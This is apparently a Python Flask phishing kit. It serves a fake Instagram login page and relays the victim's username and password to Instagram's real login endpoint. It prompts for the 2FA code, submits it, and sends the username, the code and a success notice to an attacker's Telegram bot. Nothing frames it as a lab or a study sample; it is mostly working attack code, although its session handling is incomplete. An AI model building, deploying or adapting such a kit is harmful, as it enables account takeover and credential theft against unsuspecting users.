# app.py
from flask import Flask, request, render_template_string
import requests
import json
import os

app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

@app.route('/')
def login_page():
    return render_template_string('''
        <html>
            <body>
                <h2>Instagram Login</h2>
                <form id="loginForm">
                    Username: <input type="text" name="username"><br>
                    Password: <input type="password" name="password"><br>
                    <button type="submit">Login</button>
                </form>
                <div id="status"></div>
                <script>
                    document.getElementById('loginForm').addEventListener('submit', async (e) => {
                        e.preventDefault();
                        const data = new FormData(e.target);
                        const response = await fetch('/login', {
                            method: 'POST',
                            body: JSON.stringify(Object.fromEntries(data)),
                            headers: {'Content-Type': 'application/json'}
                        });
                        const result = await response.json();
                        document.getElementById('status').innerHTML = result.message;
                        if(result.two_factor_required) {
                            const code = prompt("Enter 2FA code:");
                            if(code) {
                                fetch('/2fa', {
                                    method: 'POST',
                                    body: JSON.stringify({code, session_id: result.session_id}),
                                    headers: {'Content-Type': 'application/json'}
                                });
                            }
                        }
                    });
                </script>
            </body>
        </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data['username']
    password = data['password']
    
    # Send to Telegram bot
    send_telegram_message(f"Login attempt: {username}")
    
    # Attempt login (simplified)
    try:
        response = requests.post(
            "https://www.instagram.com/accounts/login/ajax/",
            headers={"X-IG-App-ID": "936619743392459"},
            data={
                "username": username,
                "password": password,
                "queryParams": json.dumps({"source": "auth"}),
                "optIntoOneTap": "false",
                "trustedContactFetchParams": ""
            }
        )
        
        if "two_factor_required" in response.text:
            return {"message": "2FA required", "two_factor_required": True}
        elif "authenticated" in response.text:
            return {"message": "Login successful", "authenticated": True}
        else:
            return {"message": "Login failed"}
    except Exception as e:
        return {"message": f"Error: {str(e)}"}

@app.route('/2fa', methods=['POST'])
def two_factor():
    data = request.get_json()
    code = data['code']
    session_id = data['session_id']
    
    # Send to Telegram bot
    send_telegram_message(f"2FA Code: {code}")
    
    # Submit 2FA code (simplified)
    try:
        response = requests.post(
            "https://www.instagram.com/accounts/login/ajax/two_factor/",
            headers={"X-IG-App-ID": "936619743392459"},
            cookies={"sessionid": session_id},
            data={"trust_this_device": "0", "verification_code": code}
        )
        
        if "authenticated" in response.text:
            send_telegram_message("Session established!")
            return {"message": "Login successful"}
        else:
            return {"message": "2FA failed"}
    except Exception as e:
        return {"message": f"Error: {str(e)}"}

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)